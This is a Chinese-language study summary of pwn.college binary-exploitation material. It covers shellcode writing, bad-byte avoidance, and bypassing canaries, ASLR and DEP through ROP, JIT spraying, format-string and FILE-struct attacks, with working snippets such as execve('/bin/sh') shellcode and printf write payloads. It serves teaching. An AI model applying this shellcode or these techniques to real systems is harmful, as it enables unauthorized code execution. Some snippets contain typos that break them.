最近刚刚在pwn.college上已经获得了蓝带，现在总结下：

## x86基础

x86体系架构以及汇编：网上一堆教程自己找着看吧。

linux上的函数调用约定；然后就自己手写汇编反弹shell会各种的syscall传参。如何压缩shellcode，如何绕过一些特殊字符的限制

### 汇编示例

execve("/bin/sh", NULL, NULL)

```assembly
.global _start
_start:
.intel_syntax noprefix
mov rax, 59
lea rdi, [rip+binsh]
mov rsi, 0
mov rdx,0
syscall
binsh:
.string "/bin/sh"

```

提取shellcode

```shell
#assmbly it!
gcc -nostdlib -static shellcode.s -o shellcode-elf

objcopy --dump-section .text=shellcode-raw shellcode-elf

Assemble Code
as -o shellcode.o shellcode.s

Link Object File
ld -o shellcode shellcode.o

Link Object File
objcopy -–dump-section .text=shellcode-raw shellcode-elf

```

再比如`sendfile(1, open("flag", NULL), 0, 1000); exit()`

```assembly
mov rbx, 0x00000067616c662f
push rbx
mov rax, 2
mov rdi, rsp
mov rsi, 0
syscall

mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 1000
mov rax, 40
syscall

mov rax, 60
syscall
```

也可以使用python的pwntools生成

```python
from pwn import *
context.arch = "amd64"
my_sc_bytes = asm('''mov rax, 0x1337''')
# display the bytes
print(disasm(my_sc_bytes))


#shellcraft 自动化生成
from pwn import *
context.arch = "amd64"
my_sc = asm(shellcraft.cat("/flag")
# display the bytes
print(disasm(my_sc_bytes))
```



### 调试shellcode的方法

#### Debug shellcode with strace

```shell
$cat my_shellcode | strace ./target_binary 
```

#### Debug shellcode with pwntools

```python
#Debug shellcode with pwntools
from pwn import *
Context.arch = “amd64”
sc_bytes = asm(‘’’
  int3
  mov rax, 0x1337
  ‘’’)
#p = process(“challenge/whatever”)
p = gdb.debug(“/challenge/whatever”)
p.send(sc_bytes)
p.interactive()


#Debug shellcode inside the challenge itself
from pwn import *
context.arch = “amd64”
sc_bytes = asm('''
  int3
  mov rax, 0x1337
  ''')
#p = process(“challenge/whatever”)
p = gdb.debug(“/challenge/whatever”)
p.send(sc_bytes)
p.interactive()


#Testing your shellcode for “bad bytes”
from pwn import *
Context.arch = “amd64”
sc_bytes = asm('''mov rax, 0x1337''')
print(disasm(sc_bytes))
if b’X’ in sc_bytes:
    print(“X was found in the shellcode!”

```



### 跨平台的shellcode

#### shellcode for otherarchitectures

Our way of building shellcode translates well to other architectures:

- amd64: gcc -nostdlib -static shellcode.s -o shellcode-elf

- mips: **mips-linux-gnu-**gcc -nostdlib shellcode-mips.s -o shellcode-mips-elf

Similarly, we can run cross-architecture shellcode with an emulator:

- amd64: ./shellcode

- mips: **qemu-mips-static** ./shellcode-mips

Useful qemu options:

-  -strace		print out a log of the system calls (like strace)

-  -g 1234		wait for a gdb connection on port 1234. Connect with
   	target remote localhost:1234 in gdb-multiarch

```shell
mips: mips-linux-gun-gcc -nostdlib xxx.s -o xxx
qemu-mips-static ./xxx
qemu useful option:
-strace
-g 1234
```

#### 跨架构的shellcode制作方法：

以x86的32 位和 64 位为例，制作跨平台运行的shellcode：典型策略：以“多语言”方式启动，对实际架构进行指纹识别，然后跳转到特定于架构的shellcode。

1. 将 eax 推送到堆栈（x86 和 amd64 上的操作码相同）
2. 检查 esp 是否移位 32 位或 64 位（x86 和 amd64 上的操作码相同）
3. 如果是 32 位，则跳转到 32 位 shellcode，如果是 64 位，则跳转到 64 位

### 汇编的操作数的宽度：

```assembly
1-byte : mov [rax], bl
2-byte : mov [rax], bx
4-byte : mov [rax], ebx
8-byte : mov [rax], rbx

1-byte : mov BYTE PTR[rax], 5
2-byte : mov WORD PTR [rax], 5
4-byte : mov DWORD PTR [rax], 5
8-byte : mov QWORD PTR [rax], 5
```



### 输入的一些限制

我们在制作shellcode的时候要考虑输入的函数在遇到特殊的字符的时候会自动截断等问题。

| Byte(hex value)                                     | Problematic Methods                  |
| --------------------------------------------------- | ------------------------------------ |
| Null byte \0 (0x00)                                 | strcpy                               |
| Newline \n (0x0a)                                   | scanf gets getline fgets             |
| Carriage return \r (0x0d)Space (0x20) Tab \t (0x09) | scanf                                |
| DEL (0x7f)                                          | protocol-specific(telnet VT100, etc) |

当然实际情况更复杂，比如input format只允许可打印的字符...

shellcode变形demo：

| Filter      | Bad                                                      | Good                                                         |
| ----------- | -------------------------------------------------------- | ------------------------------------------------------------ |
| no NULLs    | mov rax, 0 (48c7c0**00000000**)                          | xor rax, rax (4831C0)                                        |
| no NULLs    | mov rax, 5 (48c7c005**000000)**                          | xor rax, rax; mov al, 5 (4831C0B005)                         |
| no newlines | mov rax, 10 (48c7c0**0a**000000**)**                     | mov rax, 9; inc rax (48C7C00900000048FFC0)                   |
| no NULLs    | mov rbx, 0x67616c662f "/flag" (48BB2F666C6167**000000**) | mov ebx, 0x67616c66; shl rbx, 8; mov bl, 0x2f (BB666C616748C1E308B32F) |
| printables  | mov rax, rbx (48**89d8**)                                | push rbx; pop rax (5358, "SX")                               |

如果shellcode的约束太难用巧妙的变形来解决，但是你的 shellcode 所映射的页面是可写的......

记住：code == data

Bypassing a restriction on `int 3`:

```assembly
inc BYTE PTR [rip]
.byte 0xcb
```

When testing this, you'll need to make sure .text is writable:

```shell
gcc -Wl -N --static -nostdlib -o test test.s
```

### x86和amd64的一些不一样的地方

#### 特殊情况：字符"H"

在 amd64 shellcode 中，有一个字符比其他任何字符都更突出：“H”。

* AMD 将 amd64 设计为与 x86 *向后兼容*，以便实际采用。在 amd64 处理器上执行的 x86 代码将完全按照 x86 代码运行。大多数情况下，amd64 是一个纯扩展，由16进制的0x48(字符"H")的指令前缀控制。
  例外情况：在 amd64 上，push 和 pop 适用于 64 位值（rax 等），无需前缀。

| x86                  | amd64                       |
| -------------------- | --------------------------- |
| mov eax, ebx (89 d8) | mov rax, rbx (**48** 89 d8) |
| inc eax (ff c0)      | inc rax (**48** ff c0)      |

#### system calls

**amd64** uses the `syscall` instruction to dispatch a system call to the OS kernel.

**x86** used the `int 0x80` instruction to trigger an interrupt that would be interpreted by the OS kernel as a system call.

这是两个不同的指令，具有不同的系统调用映射！当然在 amd64 中也能使用 `int 0x80`。

有用的资源: 

- [chromium项目Syscalls](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md) [新地址](https://www.chromium.org/chromium-os/developer-library/reference/linux-constants/syscalls/)
- [Wikipedia](https://en.wikipedia.org/wiki/Shellcode)
- [x86_64 assembly listing](http://ref.x86asm.net/coder64.html)
- [Syscall Table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
- [Another syscall table, with multiple architectures!](https://syscall.sh/)

## 越过防护

### Stack Canary

1. 泄漏Canary，

2. 对于fork的程序，可以使用brute-force的方法

   例如这种情况：

   ```c
   int main() {
       char buf[16];
       while (1) {
           if (fork()) { wait(0); }
           else { read(0, buf, 128); return; }
       }
   }
   ```

   

3. 写的时候跳过去

   例如这种情况可以通过控制i的值跳过canary：

   ```c
   int main() {
       char buf[16];
       int i;
       for (i = 0; i < 128; i++) read(0, buf+i, 1);
   }
   ```

   

4. 在程序返回之前劫持程序

### ASLR (Address Space Layout Randomization)

History:First appeared in 2001 as part of a Linux kernel patch set called **PaX**. Written by a team led by an anonymous coder...(**PaX** also brought DEP to Linux)

1. leak

2. YOLO

   程序都是页对齐的，所以低12位是固定的。我们可以只overwrite两个字节（当然也得需要部分brute-force）

3. brute-force（跟canary相似的情况，fork）

   ```c
   int main() {
       char buf[16];
       while (1) {
           if (fork()) { wait(0); }
           else { read(0, buf, 128); return; }
       }
   }
   ```

#### Disabling ASLR for local testing

```shell
pwn.process("./vulnerable_proram", aslr=False)
```

gdb will disable ASLR by default if has permissions to do so. 

NOTE: for SUID binaries, remove the SUID bit before using gdb (chmod or cp).

可以启动一个 shell，其 (非 setuid) 子进程都将禁用 ASLR：

```shell
setarch x86_64 -R /bin/bash
```

### DEP:

#### ROP

从内存中已有的一组奇怪的指令中进行选择。使用 ret和堆栈上的地址链接指令（ropchains）。达到和连续的shellcode的一样的效果。

Return to libc :Discovered in 1997 by Solar Designer.

Code reuse in AMD64

The generalization of Return-to-libc is Return Oriented Programming.

##### 注意点：

1. syscalls are rare. 

   - In shellcode, you use syscall to invoke system calls. This instruction is quite rare in normal programs (even as a part of other instructions).You might have to call library functions, instead!
   - Advice: Keep it Simple.

2. know your environment. ex:heap address and stack address in register and stacks...

3. finding the rop gadgets

   - Many tools available [ctftools](https://github.com/zardus/ctf-tools) has installers for 3!. 
   - For example, rp++:

   ```shell
   rp++ --unique -r2 -f /bin/bash
   
   # Can also try greater values than 2, but long gadgets become increasingly unstable (side-effects!).
   # From here, regular expressions are your friends.
   
   rp++ --unique -r2 -f /bin/bash | grep -P "(add|sub|mov) rax, r.."
   ```

4. Sometimes, your control of the stack is limited.  ex: Limited overflow size.  Inability to input NULL bytes. Often, we can still trigger one gadget!

   Consider system()...

   - it has to set up a call to execve("/bin/sh", {"/bin/sh", "-c", command}, env);
   - what if we jump partway through?

   This actually works! If you get lucky with register values and stack setup, you can often trigger /bin/sh by jumping partway into system(). This location is called the **magic gadget**.

   More useful for you: trigger execve(some_garbage); and create a some_garbage file that reads the flag.

5. ASLR （跟之前讨论过的ASLR的方法类似，通过部分overwrite）

6. Stack Canary

   泄漏或者绕过

7. 一些缓解rop的措施

   Anti-ROP approaches:

   删除 ROP gadgets（太繁重）：
   G-Free：通过无小工具的二进制文件击败面向返回的编程
   检测正在进行的 ROP（已部署，但可绕过）：
   kBouncer：高效且透明的 ROP 缓解
   ROPecker：一种通用且实用的防御 ROP 攻击的方法

8. 控制流完整性 Control Flow Integrity

   2009 年，Martin Abadi、Mihai Budiu、Ulfar Erlingsson 和 Jay Ligatti 在Control-Flow Integrity: Principles, Implementations, and Applications中提出了这一建议。
   核心思想：每当发生可劫持的控制流传输时，确保其目标是它应该能够返回的东西！
   这引发了一场军备竞赛。
   反 CFI 技术：

   **B(lock)OP:** ROP on a block (or multi-block) level by carefully compensating for side-effects.

   **J(ump)OP:** instead of returns, use indirect jumps to control execution flow

   **C(all)OP:** instead of returns, use indirect calls to control execution flow

   **S(ignreturn)ROP:** instead of returns, use the sigreturn system call

   **D(ata)OP:** instead of hijacking control flow, carefully overwrite the program's data to puppet it

   **ex：Control Flow Integrity: Intel Edition!**

   - 英特尔（2020 年 9 月）发布了具有控制流执行技术 (CET) (Control-flow Enforcement Technology)的处理器。CET添加了endbr64 指令。在启用 CET 的 CPU 上，间接跳转（包括 ret、jmp rax、call rdx 等）必须以 endbr64 指令结束，否则程序将终止。这仍然可以通过一些高级 ROP 技术（面向块编程、SROP 等）绕过，但它将大大增加利用的复杂性。

9. Hacking Blind

   Proposed by Andrea Bittau at the 2014 IEEE Symposium on Security & Privacy.

   http://www.scs.stanford.edu/brop/bittau-brop.pdf

   逐字节破坏 ASLR 和金丝雀，我们可以半控制地重定向内存。重定向内存，直到我们有一个生存信号（即不会崩溃的地址）。使用生存信号查找非崩溃的 ROP 小工具。查找产生输出的功能。泄漏程序。破解它。

#### 存在JIT的系统

在现代系统中，默认情况下，stack和heap是不可执行的。但是现代高级语言（JavaScript、Java、Lua、Python 等）都使用即时编译。代码是用 JavaScript 编写的。在运行时，必要的代码被编译为二进制代码，因为二进制代码执行速度非常快。当然，这意味着能够注入高级代码的攻击者可以影响生成的本机代码……

##### JIT编译：

- Just in Time compilers need to generate (and frequently re-generate) code that is executed.
- Pages must be writable for code generation.
- Pages must be executable for execution.
- Pages must be writable for code *re-generation*.

The safe thing to do would be to:

1. mmap(PROT_READ|PROT_WRITE)
2. write the code
3. mprotect(PROT_READ|PROT_EXEC)
4. execute
5. mprotect(PROT_READ|PROT_WRITE)
6. update code
7. etc...

但是这种方式太慢了，所以PROT_WRITE|PROT_EXEC的页面太常见了。

If your binary uses a library that has a writable+executable page, that page lives in your memory space!

Consider the following JavaScript:
`var asdf = 0x050f3cb0c031;`
This might JIT to:
`mov rdx, 0x050f3cb0c031`
Which assembles to:
`48 ba 31 c0 be 3c 0f 05 00 00`
What if we jump to the 0x31 via another vulnerability?
`31 c0: xor eax, eax `
`be 3c: mov al, 0x3c` 
`0f 05: syscall`

Shellcode execution (in this case, exit())!

JIT is used *everywhere*: browsers, Java, and most interpreted language runtimes (luajit, pypy, etc), so this vector is very relevant.

##### JIT spraying

Shellcode injection technique: JIT spraying.

- Make constants in the code that will be JITed:
  	`var evil = "%90%90%90%90%90";`
- The JIT engine will mprotect(PROT_WRITE), compile the code into memory, then mprotect(PROT_EXEC). Your constant is now present in executable memory.
- Use a vulnerability to redirect execution into the constant.

## Format String Exploits

### printf - (turing) complete mastery

When run in a loop, printf is *turing complete*!

https://github.com/HexHive/printbf

### printf - leaking memory

Memory can be leaked by using:

%c: read a char off the stack

%d, %i, %x: read an int (4 bytes) off the stack

%x: read an int (4 bytes) in hex

%s: dereference a pointer and read out bytes until a null byte

### printf - controlling how much you leak

Size parameters:

%x leaks 4 bytes

%hx leaks 2 bytes

%hhx leaks 1 byte

%lx leaks 8 bytes

### printf - controlling what you leak

In their infinite wisdom, the glibc developers have given us $.

%7$x - print the *7th* parameter (on the stack)

### other functions

Format strings are sometimes:

- dynamically generated
- used for internal logic, as opposed to i/o (i.e., sprintf, snprintf, sscanf)
- used for logging (fprintf)
- used for input (scanf)

All of these are exploitable.

### printf - writing memory

%n requires a pointer to where we want to write. But:

1. **if our buffer is on the stack (and we can put a valid pointer into it), we can use that!**
2. %7$n (and other offsets) let us use different pointers on the stack
3. frame pointers point to each other!
4. we can target ebp1 for %n, and modify ebp2, then target ebp2

### Problem: %n writes 4 bytes.

Solution:

- %ln
- %hn
- %hhn

### Problem: how do we control *what* to write?

Solution:

char buf[4];

printf("%1145258561x%1$n", buf);

### Problem: limiting output amount?

Solution:

char buf[4];

printf("%65x%1$hhn%c%2$hhn%c%3$hhn%c%4$hhn", buf, buf+1, buf+2, buf+3);

### One more thing: `%*10$c%11$n`

specifies a *dynamic padding size*. This will:

1. get the 10th parameter
2. *use it as the padding size* of a single character
3. print that many bytes
4. write the number of bytes printed to the memory pointed to by the 11th parameter.

This results in a copy.

### 使用pwntools生成基于printf的exp

fmtstr_payload() 和 leak_stack()

详细用法示例可以参考当时的writeup

## File Struct Exploits

攻击面总结：

1. 修改结构体中的缓冲区指针，实现任意地址读写
2. 覆盖vtable达到控制执行流的目的

[fs.h](https://elixir.bootlin.com/linux/latest/source/include/linux/fs.h#L940)

[FILE](https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/bits/types/struct_FILE.h#L49)

## 堆问题

coming

## Linux内核

coming

## 基于CPU缓存的攻击

详见demo